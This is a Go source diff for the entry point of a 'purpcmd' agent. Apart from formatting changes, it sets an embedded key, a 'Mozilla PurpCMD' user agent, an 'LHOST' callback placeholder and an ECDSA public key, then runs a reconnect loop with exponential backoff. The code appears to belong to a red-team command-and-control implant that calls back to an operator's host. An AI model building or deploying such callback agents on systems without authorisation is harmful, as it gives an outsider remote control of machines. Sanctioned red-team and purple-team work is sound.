@@ -1,23 +1,23 @@
 package main
 
 import (
-	"log"
 	"embed"
+	"log"
 	"time"
 
 	"purpcmd/agent"
 )
 
-
 //go:embed key
 var key embed.FS
+
 func main() {
-	ua  := "Mozilla PurpCMD"
+	ua := "Mozilla PurpCMD"
 	uri := "/"
 	remoteAdd := "LHOST" // Replaced
 	pk := ""
-	ps := ""
-	
+	ps := "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDm7lFJASftWM9Bmw+sQnjNtr48wXhSRDf43XUhbfRBT05j5dZ4+2qUhPt5gugkECSINzOs2nGz0hkCFTGDqPIM="
+
 	var t time.Duration = 1
 	var c int = 0
 	for {
@@ -28,7 +28,7 @@ func main() {
 			if t >= 32768 {
 				continue
 			} else {
-				t *= 2 
+				t *= 2
 			}
 		} else {
 			break
